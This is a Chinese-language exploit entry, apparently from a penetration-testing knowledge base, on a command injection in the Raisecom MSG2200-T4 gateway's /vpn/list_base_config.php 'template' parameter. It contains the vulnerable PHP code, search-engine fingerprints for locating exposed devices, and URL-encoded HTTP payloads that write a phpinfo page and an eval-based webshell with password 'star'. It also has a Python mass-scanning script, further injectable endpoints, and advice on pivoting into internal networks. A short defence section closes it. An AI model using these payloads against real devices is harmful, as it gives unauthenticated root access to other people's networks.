---
id: iot-raisecom-msg2200-t4-list-base-config-template-command-injection
title: 瑞斯康达 MSG2200-T4 智能网关 /vpn/list_base_config.php template 命令注入：反引号写 PHP WebShell
type: scenario
domain: iot
path: iot
technique: raisecom-msg2200-t4-template-command-injection
aliases:
- 瑞斯康达 RCE
- Raisecom RCE
- MSG2200-T4
- list_base_config.php
- sslvpn_config_mod
- template 命令注入
tags:
- iot
- raisecom
- gateway
- command-injection
- php
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V254
  verified_at: '2026-11-07T16:07:04+08:00'
  notes: 已对照原文与10张图片逐项核对：/vpn/list_base_config.php参数、sslvpn_class.php拼接命令、反引号写PHP、/www/tmp路径、whoami=root、批量脚本均与原文一致；修正图片phpinfo所示CGI/FastCGI笔误（原CGU）；原文未给固件版本区间，未设置affected_versions
---

## 一句话结论

瑞斯康达 MSG2200-T4 多业务智能网关的 `/vpn/list_base_config.php?type=mod&parts=base_config&template=<payload>` 会把 `template` 直接拼进 `cp -f /usr/local/sslroot/pages<template>/*.html ...` 并交给 `exec()`；用反引号把 `echo -e '<?php ...?>'>/www/tmp/test.php` 作为 template 值，即可在 Web 目录写入 PHP WebShell，访问 `/tmp/test.php` 后以 `root` 权限执行命令。

## 原理

- `/vpn/list_base_config.php` 读取 `type`/`parts`/`pages`/`serch_value` 等 `$_REQUEST` 参数，当 `parts=base_config` 且 `type=mod` 时调用 `$obj_sslvpn->sslvpn_config_mod(2)`。
- `php_class/sslvpn_class.php` 的 `sslvpn_config_mod()` 直接使用 `$_REQUEST['template']` 拼接命令：
  ```php
  $mod_xml .= '<template>'.$_REQUEST['template'].'</template>';
  $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/*.html /usr/local/sslroot/pages/';
  exec($start_comm);
  $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/images'.$_REQUEST['stylenum'].'/* /usr/local/sslroot/pages/images/';
  exec($start_comm);
  $start_comm = 'cp -f /usr/local/sslroot/pages'.$_REQUEST['template'].'/utmcss'.$_REQUEST['stylenum'].'.css /usr/local/sslroot/utmcss.css';
  exec($start_comm);
  ```
  `template` 和 `stylenum` 都没有过滤/转义，且直接出现在 shell 命令中；反引号 `` ` ``、`;`、`$()` 等都会被 shell 解释为命令替换/命令分隔。
- 攻击者把 `template` 设为 `` `echo -e '<?php phpinfo();unlink(__FILE__);?>'>/www/tmp/test.php` ``：外层 `cp -f /usr/local/sslroot/pages` 后先执行反引号内的 `echo`，把 PHP 代码写入 `/www/tmp/test.php`；反引号返回空，原 `cp` 命令继续执行但已无关紧要。Web 根目录 `/www` 映射到 URL `/`，因此写入的文件可通过 `/tmp/test.php` 访问。
- 案例设备 PHP 5.6.36 + CGI/FastCGI、Linux aarch64；Web 进程以 `root` 运行，写入的 WebShell 直接继承 root 权限（`whoami` 返回 `root`）。
- 同一 `sslvpn_config_mod()` 还被 `list_ip_network.php`、`list_service_manage.php`、`list_vpn_web_custom.php`、`vpn_template_style.php` 等文件以不同 `config_type` 调用，`template` sink 相同，因此这些入口同样可注入。

## 触发条件

- 目标为瑞斯康达 MSG2200-T4（或同系列使用该 PHP 管理界面的智能网关）；原文未给出固件版本区间。
- `/vpn/list_base_config.php` 可访问（案例未登录即可直接请求并写入文件；实际部署需确认鉴权）。
- `template` 参数可控，且 `/www/tmp`（映射 URL `/tmp`）可写；`exec()` 未被禁用。
- 目标 Web 服务以 root 或高权限运行（案例为 root）。

## 利用步骤

1. 指纹识别：FOFA/Quake/Hunter 使用 `body="/images/raisecom/back.gif" && title=="Web user login"`、`body="oForm.user_name.value"` 等；打开登录页确认瑞斯康达网关样式。
2. 构造 template 命令注入，先写 phpinfo 验证：
   ```text
   /vpn/list_base_config.php?type=mod&parts=base_config&template=`echo -e '<?php phpinfo();unlink(__FILE__);?>'>/www/tmp/test.php`
   ```
   浏览器/工具发送前必须对反引号、引号、`<`、`>`、`/` 等做 URL 编码。
3. 访问 `http://target/tmp/test.php`，出现 phpinfo 页面即确认命令执行；页面带 `unlink(__FILE__)`，刷新后文件会自删（验证时注意）。
4. 写 WebShell：
   ```text
   /vpn/list_base_config.php?type=mod&parts=base_config&template=`echo -e '<?php eval($_POST["star"]);?>'>/www/tmp/test555.php`
   ```
5. 用蚁剑/菜刀连接 `http://target/tmp/test555.php`，密码 `star`；执行 `whoami`（案例 `root`）、`ifconfig` 收集网卡/内网信息。
6. 也可改用反弹 shell 或写入其他 Web 可访问路径；根据网卡情况继续内网渗透。
7. 批量检测：对 URL 列表请求写入 `echo 5201314` 的 php 文件，再访问 `/tmp/test.php` 检查回显（见 PoC）。

## PoC

```http
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: close
```

```text
# 解码后的 template 值：
`echo -e '<?php phpinfo();unlink(__FILE__);?>'>/www/tmp/test.php`
# 访问 http://target/tmp/test.php 验证 phpinfo
```

WebShell：

```http
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3c%3fphp+eval(%24_POST%5b%22star%22%5d)%3b%3f%3e%27%3e%2fwww%2ftmp%2ftest555.php%60 HTTP/1.1
Host: target
```

```text
# 解码后的 template 值：
`echo -e '<?php eval($_POST["star"]);?>'>/www/tmp/test555.php`
# 蚁剑连接 http://target/tmp/test555.php，密码 star
```

批量检测脚本核心：

```python
import requests
payload = "%60echo+-e+%27%3C%3Fphp+echo+5201314%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60"
requests.get(url + "/vpn/list_base_config.php?type=mod&parts=base_config&template=" + payload, timeout=10, verify=False)
r = requests.get(url + "/tmp/test.php", timeout=10, verify=False)
if "5201314" in r.text:
    print("[+] vulnerable:", url)
```

## 变体与关联

- 其他入口：`/vpn/list_ip_network.php?Nradius_submit=true&template=<payload>`、`/vpn/list_service_manage.php?Nradius_submit=true&template=<payload>`、`/vpn/list_vpn_web_custom.php?Nradius_submit=true&template=<payload>`、`/vpn/vpn_template_style.php?mySubmit=true&template=<payload>`（不同 `config_type` 调用同一 `sslvpn_config_mod`）。
- `stylenum` 同样未过滤，可拼接在 images/utmcss 路径中注入；可与 `template` 组合。
- 命令分隔符可用反引号、`;`、`&&`、`|`、`$()`，需按目标 shell 与过滤情况选择；写入路径可换成其他 Web 可访问目录。
- 同类设备命令注入：`iot-dlink-dir615-645-815-service-cgi-event-command-injection`、`iot-firmware-boa-pin-command-injection`、`iot-tenda-ac15-goform-telnet-command-injection` 等。
- 该设备常暴露在政企/园区边界，可作为进入内网的跳板。

## 检测与防御

- 升级到厂商修复固件；无法升级时限制 `/vpn/` 管理界面仅内网/管理网访问，禁止公网暴露。
- 对 `template`/`stylenum` 做严格白名单（如 `^[a-zA-Z0-9_]+$`）并用 `escapeshellarg()`/`escapeshellcmd()` 转义，避免直接拼接 `exec()`。
- Web 进程降权运行，`/www` 目录只读，禁用不必要的 `exec`/`system` 等函数。
- 检测：WAF/日志拦截 `/vpn/list_base_config.php` 中 `template` 含反引号、`;`、`$(`、`>`、`<` 等字符的请求；监控 Web 目录新增 `.php` 文件与 `rchttpd`/PHP 子进程执行 `cp`、`echo`、`sh` 等异常行为。
- 主机侧部署文件完整性校验，定期排查 `/www/tmp` 等可写目录中的 WebShell。
